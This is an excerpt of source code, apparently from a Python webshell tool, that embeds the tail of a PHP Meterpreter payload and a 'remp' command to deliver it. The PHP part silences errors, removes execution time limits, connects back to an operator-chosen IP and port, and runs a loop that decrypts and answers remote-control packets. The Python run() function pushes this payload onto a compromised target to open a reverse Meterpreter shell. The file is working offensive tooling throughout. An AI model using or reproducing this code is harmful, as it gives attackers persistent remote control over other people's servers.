					$tmp = fread($resource, $len);
					$last_requested_len = $len;
					$buff .= $tmp;
					if (strlen($tmp) < $len) {
						break; 
					}
				} 
				if ($resource != $msgsock) {
					my_print("buff: '$buff'");
				} 
				$r = Array($resource); 
			} 
			my_print(sprintf("Done with the big read loop on $resource, got %d bytes, asked for %d bytes", strlen($buff), $last_requested_len));
			break; 
			default: 
				$cid = get_channel_id_from_resource($resource);
				$c = get_channel_by_id($cid);
				if ($c and $c['data']) {
					$buff = substr($c['data'], 0, $len);
					$c['data'] = substr($c['data'], $len);
					my_print("Aha! got some leftovers"); 
				} else {
					my_print("Wtf don't know how to read from resource $resource, c: $c");
					if (is_array($c)) {
						dump_array($c); 
					} 
					break; 
				} 
	} 
	my_print(sprintf("Read %d bytes", strlen($buff)));
	return $buff; 
} 

function write($resource, $buff, $len=0) {
	global $udp_host_map;
	if ($len == 0) {
		$len = strlen($buff); 
	}
	$count = false;
	switch (get_rtype($resource)) {
		case 'socket': if (array_key_exists((int)$resource, $udp_host_map)) {
			my_print("Writing UDP socket");
			list($host,$port) = $udp_host_map[(int)$resource];
			$count = socket_sendto($resource, $buff, $len, $host, $port);
		} else { 
			$count = socket_write($resource, $buff, $len); 
		} break; 
		case 'stream': 
			$count = fwrite($resource, $buff, $len);
			fflush($resource); 
			break; 
		default: 
			my_print("Wtf don't know how to write to resource $resource"); 
			break; 
	} 
	return $count; 
} 

function get_rtype($resource) {
	global $resource_type_map;
	if (array_key_exists((int)$resource, $resource_type_map)) {
		return $resource_type_map[(int)$resource]; 
	} 
	return false; 
} 

function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
	$streams_r = array();
	$streams_w = array();
	$streams_e = array();
	$sockets_r = array();
	$sockets_w = array();
	$sockets_e = array();
	if ($r) { 
		foreach ($r as $resource) {
			switch (get_rtype($resource)) {
				case 'socket': $sockets_r[] = $resource;break; 
				case 'stream': $streams_r[] = $resource; break;
				default: my_print("Unknown resource type"); break; 
			} 
		} 
	} 
	if ($w) { 
		foreach ($w as $resource) {
			switch (get_rtype($resource)) {
				case 'socket': $sockets_w[] = $resource; break;
				case 'stream': $streams_w[] = $resource; break;
				default: my_print("Unknown resource type"); break;
			} 
		} 
	} 
	if ($e) {
		foreach ($e as $resource) {
			switch (get_rtype($resource)) {
				case 'socket': $sockets_e[] = $resource; break;
				case 'stream': $streams_e[] = $resource; break;
				default: my_print("Unknown resource type"); break; 
			} 
		} 
	} 
	$n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e);
	$n_streams = count($streams_r) + count($streams_w) + count($streams_e);
	$r = array();
	$w = array();
	$e = array();
	if (count($sockets_r)==0) {
		$sockets_r = null; 
	} 
	if (count($sockets_w)==0) {
		$sockets_w = null; 
	} 
	if (count($sockets_e)==0) {
		$sockets_e = null; 
	}
	if (count($streams_r)==0) {
		$streams_r = null; 
	}
	if (count($streams_w)==0) {
		$streams_w = null; 
	}
	if (count($streams_e)==0) {
		$streams_e = null; 
	}
	$count = 0; 
	if ($n_sockets > 0) {
		$res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec);
		if (false === $res) {
			return false; 
		} 
		if (is_array($r) && is_array($sockets_r)) {
			$r = array_merge($r, $sockets_r); 
		} 
		if (is_array($w) && is_array($sockets_w)) {
			$w = array_merge($w, $sockets_w); 
		} 
		if (is_array($e) && is_array($sockets_e)) {
			$e = array_merge($e, $sockets_e); 
		} 
		$count += $res; 
	} 
	if ($n_streams > 0) {
		$res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec);
		if (false === $res) {
			return false; 
		} 
		if (is_array($r) && is_array($streams_r)) {
			$r = array_merge($r, $streams_r); 
		} 
		if (is_array($w) && is_array($streams_w)) {
			$w = array_merge($w, $streams_w); 
		} 
		if (is_array($e) && is_array($streams_e)) {
			$e = array_merge($e, $streams_e); 
		} 
		$count += $res; 
	} 
	return $count; 
} 

function add_reader($resource) {
	global $readers; 
	if (is_resource($resource) && !in_array($resource, $readers)) {
		$readers[] = $resource; 
	} 
}

function remove_reader($resource) {
	global $readers;
	if (in_array($resource, $readers)) {
		foreach ($readers as $key => $r) {
			if ($r == $resource) {
				unset($readers[$key]); 
			} 
		} 
	} 
} 

ob_implicit_flush(); 
error_reporting(0); 
@ignore_user_abort(true); 
@set_time_limit(0); 
@ignore_user_abort(1); 
@ini_set('max_execution_time',0); 
$GLOBALS['UUID'] = PAYLOAD_UUID; 
$GLOBALS['SESSION_GUID'] = SESSION_GUID; 
$GLOBALS['AES_KEY'] = null; 
$GLOBALS['AES_ENABLED'] = false; 
if (!isset($GLOBALS['msgsock'])) { 
	$ipaddr = '""" + ip + """'; 
	$port = """ + str(port) + """; 
	my_print("Don't have a msgsock, trying to connect($ipaddr, $port)"); 
	$msgsock = connect($ipaddr, $port); 
	if (!$msgsock) { 
		die(); 
	} 
} else { 
	$msgsock = $GLOBALS['msgsock']; 
	$msgsock_type = $GLOBALS['msgsock_type']; 
	switch ($msgsock_type) { 
		case 'socket': register_socket($msgsock); break;
		case 'stream': 
		default: register_stream($msgsock); 
	} 
} 

add_reader($msgsock);
$r=$GLOBALS['readers']; 
$w=NULL;
$e=NULL;
$t=1; 
while (false !== ($cnt = select($r, $w, $e, $t))) {
	$read_failed = false;
	for ($i = 0; $i < $cnt; $i++) {
		$ready = $r[$i];
		if ($ready == $msgsock) {
			$packet = read($msgsock, 32);
			my_print(sprintf("Read returned %s bytes", strlen($packet)));
			if (false==$packet) {
				my_print("Read failed on main socket, bailing");
				break 2; 
			}
			$xor = substr($packet, 0, 4);
			$header = xor_bytes($xor, substr($packet, 4, 28));
			$len_array = unpack("Nlen", substr($header, 20, 4));
			$len = $len_array['len'] + 32 - 8; while (strlen($packet) < $len) {
				$packet .= read($msgsock, $len-strlen($packet)); 
			} 
			$response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
			write_tlv_to_socket($msgsock, $response);
		} else { 
			$data = read($ready);
			if (false === $data) { 
				handle_dead_resource_channel($ready); 
			} elseif (strlen($data) > 0){ 
				my_print(sprintf("Read returned %s bytes", strlen($data)));
				$request = handle_resource_read_channel($ready, $data);
				if ($request) {
					write_tlv_to_socket($msgsock, $request); 
				} 
			} 
		} 
	} 
	$r = $GLOBALS['readers']; 
} 

my_print("Finished"); 
my_print("--------------------"); 
close($msgsock);
"""

@alias(True, func_alias="remp", _type="SHELL", p="port", type="reverse_type")
def run(ip: str, port: str, reverse_type: str = "php"):
    """
    rempshell
    
    reverse meterpreter shell to a host from target system.
    eg: reverse {ip} {port} {type=php}
    
    reverse_type:
      - php
    """
    reverse_type = str(reverse_type).lower()
    if reverse_type == "php":
        php = get_php_meterpreter(ip = ip, port = port)
        t = Thread(target=send, args=(php,))
        t.setDaemon(True)
        t.start()
    else:
        print(color.red("Reverse type Error."))
        return
    sleep(1)
    if (t.isAlive()):
        print(f"\nReverse meterpreter shell to {ip}:{port} {color.green('success')}.\n")
    else:
        print(f"\nReverse meterpreter shell {color.red('error')}.\n")